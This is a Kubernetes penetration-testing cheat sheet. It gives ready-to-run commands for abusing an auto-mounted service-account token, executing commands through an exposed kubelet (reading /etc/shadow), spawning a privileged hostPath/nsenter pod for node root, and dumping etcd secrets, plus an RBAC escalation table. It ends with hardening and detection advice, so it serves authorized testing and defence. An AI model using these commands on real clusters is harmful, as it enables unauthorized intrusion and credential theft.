# Kubernetes Attack Paths

> Common cluster-compromise paths: SA-token abuse, RBAC privilege escalation, kubelet API exposure, secret-store leakage, container escape (see [./docker-escape.md](./docker-escape.md)). Authorized testing only.

## TL;DR
- Inside a pod: `/var/run/secrets/kubernetes.io/serviceaccount/token` is the auto-mounted SA bearer token; combined with `ca.crt` and `KUBERNETES_SERVICE_HOST/PORT` env vars it lets you talk to the API server.
- Cluster topology to keep in mind: API server (6443) ↔ kubelet (10250 read-only 10255) ↔ etcd (2379). Each has its own attack surface; etcd direct access = game over.
- Privesc paths: pod-create / exec / port-forward / impersonate / patch / wildcard verbs / secret-read. Use kubectl-can-i and BloodHound-for-K8s (kubehound) to map.
- Map: MITRE ATT&CK for Containers.

## Detection / Discovery

### From a compromised pod
```bash
# Auto-mounted SA bearer
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# What can I do?
curl --cacert $CA -H "Authorization: Bearer $TOKEN" \
     -X POST -H "Content-Type: application/json" \
     -d '{"spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}' \
     $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

# Cheaper read with kubectl if it's in the image
kubectl auth can-i --list
```

### From a kubeconfig
| Command | Description |
| --- | --- |
| `kubectl config view --minify --raw` | Effective config + tokens |
| `kubectl auth can-i --list` | Verbs the current identity has |
| `kubectl get pods --all-namespaces` | Pod inventory (often blocked) |
| `kubectl get secrets --all-namespaces -o yaml` | Secret dump (rarely allowed) |
| `kubectl get clusterroles,clusterrolebindings -o yaml` | RBAC graph |

### Recon tools
| Tool | Purpose |
| --- | --- |
| `peirates` | Interactive K8s attack-path TUI (Inguardians) |
| `kube-hunter` | Anonymous-side scan of the cluster (find exposed kubelet, API, dashboard) |
| `kubeaudit` / `kubescape` | Configuration audits (PSA/PSS, RBAC) |
| `kubectl-who-can` | RBAC reverse lookup |
| `kubehound` (DataDog) | BloodHound-style attack-path graph |

## Exploitation

### kubelet API exposed (10250)
Pre-1.10 default allowed anonymous; modern defaults require auth. If anonymous is enabled or you have a SA token with `nodes/proxy`:
```bash
# List pods on a node
curl -k -H "Authorization: Bearer $TOKEN" https://<node>:10250/runningpods/

# Exec into a pod via kubelet (bypasses API server audit log)
curl -k -H "Authorization: Bearer $TOKEN" \
  -X POST "https://<node>:10250/run/<ns>/<pod>/<container>?cmd=cat&cmd=/etc/shadow"
```

### Pod-create / exec / attach as privesc
A SA with `create pods` in any namespace can spawn a pod that mounts the host filesystem:
```yaml
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: <ns> }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
```
`kubectl exec` into it → root on the node (and from there, often the rest of the cluster).

### RBAC escalation patterns
| Verb available on | Path |
| --- | --- |
| `pods` (create) | Spin a privileged pod as above. |
| `pods/exec` | Exec into existing privileged pod, or one that has the master-component credentials mounted. |
| `secrets` (get/list) | Read SA tokens for other workloads with broader perms; chain. |
| `serviceaccounts/token` | Create a fresh SA token for another SA (1.24+ TokenRequest API). |
| `roles`/`rolebindings`/`clusterroles`/`clusterrolebindings` (create/patch) | Grant yourself cluster-admin. |
| `nodes/proxy` | Talk to kubelet directly (bypass audit). |
| `escalate` on a `clusterrole` | Aggregate yourself the permissions of any role. |
| `bind` on a `clusterrole` | Bind privileged roles to yourself. |
| Persistent-volume `hostPath` mount | Pod can mount host filesystem (defence: Pod Security Admission `restricted`). |
| `*` verb on `*` resource | Trivial total compromise. |

### Service-account token theft from etcd
If you reach etcd directly (2379 with `--cert`/`--key` or no client cert auth):
```bash
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd>:2379 \
  --cacert ca.crt --cert client.crt --key client.key \
  get /registry/secrets --prefix --keys-only
```
All cluster secrets are in plaintext unless EncryptionConfig is enabled.

### Cloud-bridge: pod → cloud SA via metadata
If pods run on cloud nodes (EKS / GKE / AKS) and the node identity is broad, SSRF or even pod-network access to 169.254.169.254 yields cloud credentials. See [../cloud/ssrf-cloud-metadata.md](../cloud/ssrf-cloud-metadata.md). On GKE / EKS / AKS, prefer Workload Identity / IRSA / Workload Identity (Azure AD) so each pod has its own scoped cloud token.

### Helm / Argo / Tekton
- Helm v2 `tiller` (deprecated) — cluster-admin RPC on port 44134.
- Argo CD with leaked admin password (`argocd admin initial-password`) → arbitrary repo deploy → cluster-admin via committed manifests.
- Tekton TaskRuns running as cluster-admin SA — abused via pipeline poisoning (see [../cicd-supply-chain/poisoned-pipeline-execution.md](../cicd-supply-chain/poisoned-pipeline-execution.md)).

## Defence / Remediation
- **Pod Security Admission** at `restricted` level in every namespace except those with documented exceptions. Replaces deprecated PSPs.
- **Disable automount** for SAs that don't need API access: `automountServiceAccountToken: false` on SA + pod.
- **RBAC least privilege**: no wildcards, no `cluster-admin` on workload SAs, no `pods/exec` outside ops namespaces, no `secrets:get/list` for app SAs (use projected ServiceAccountTokens with short TTL or external secret stores).
- **Authenticate kubelet** (`--authorization-mode=Webhook --anonymous-auth=false`); disable the read-only port 10255 (`--read-only-port=0`).
- **etcd**: client cert auth, TLS, EncryptionConfig at rest, network policy denying everything except control-plane.
- **NetworkPolicies** denying egress by default; explicit allow per-namespace. Crucial to block pod→IMDS.
- **Workload Identity** (cloud SA per pod, not per node) so a compromised pod doesn't inherit a broad node identity.
- **Image policy** at admission (cosign / Notation signatures, Trivy admission, OPA Gatekeeper / Kyverno).
- **Runtime detection**: Falco / Tetragon for `exec` into pods you didn't create, `nsenter`, suspicious syscalls.
- **Audit log** with verb-create / verb-update on `pods`, `rolebindings`, `secrets` shipped to SIEM.

## Sources
- Kubernetes Security Documentation: https://kubernetes.io/docs/concepts/security/
- Pod Security Admission: https://kubernetes.io/docs/concepts/security/pod-security-admission/
- HackTricks Kubernetes pentesting: https://book.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html
- DataDog kubehound (K8s BloodHound): https://github.com/DataDog/KubeHound
- kube-hunter: https://github.com/aquasecurity/kube-hunter
- peirates: https://github.com/inguardians/peirates
- NSA / CISA Kubernetes Hardening Guide: https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- MITRE ATT&CK for Containers: https://attack.mitre.org/matrices/enterprise/containers/
